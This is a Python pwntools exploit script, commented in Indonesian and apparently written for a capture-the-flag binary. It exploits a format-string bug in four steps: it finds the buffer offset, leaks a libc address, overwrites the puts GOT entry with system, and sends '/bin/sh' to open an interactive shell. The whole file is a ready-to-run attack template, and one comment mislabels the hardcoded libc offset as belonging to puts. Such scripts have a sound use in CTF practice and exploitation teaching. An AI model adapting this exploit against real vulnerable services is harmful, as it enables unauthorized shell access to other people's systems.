# Script exploit format string dengan pwntools - leak libc lalu GOT overwrite.
# Jalankan: python3 fmtstr_read.py

from pwn import *

# ===== Konfigurasi =====
context.binary = elf = ELF("./chall")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")   # sesuaikan dengan challenge
io = process("./chall")
# io = remote("host.ctf.com", 1337)

# ===== 1. Cari posisi buffer di format string =====
print("[*] Mencari posisi offset format string")

io.sendline(b"AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p")
out = io.recvline().decode()
print(out)

# cari 0x41414141 di output
pos = None
for i, part in enumerate(out.split(".")):
    if "0x41414141" in part:
        pos = i + 1
        print(f"[+] Posisi buffer: %{pos}$")
        break
if pos is None:
    pos = 6  # fallback umum di 64-bit
    print(f"[*] Pakai posisi default: {pos}")

# ===== 2. Leak libc =====
print("[*] Leak libc (coba beberapa posisi untuk alamat 0x7f...)")

libc_leak = None
for p in range(6, 12):
    io.sendline(f"%{p}$p".encode())
    try:
        val = int(io.recvline().strip(), 16)
        if val >> 40 == 0x7f:          # alamat libc biasanya 0x7f...
            print(f"[+] %{p}$p -> {hex(val)}")
            libc_leak = val
            break
    except Exception:
        continue

# hitung base - ganti OFFSET sesuai isi posisi yang di-leak (cek dengan gdb)
OFFSET = 0x29d90   # contoh offset puts; sesuaikan!
libc.address = libc_leak - OFFSET
print(f"[+] libc base @ {hex(libc.address)}")

# ===== 3. GOT overwrite puts -> system =====
print("[*] GOT overwrite puts -> system")

# syarat: Partial RELRO
payload = fmtstr_payload(pos, {elf.got.puts: libc.sym.system})
io.sendline(payload)

# ===== 4. Trigger system("/bin/sh") =====
print("[*] Trigger shell")

io.sendline(b"/bin/sh")
io.interactive()
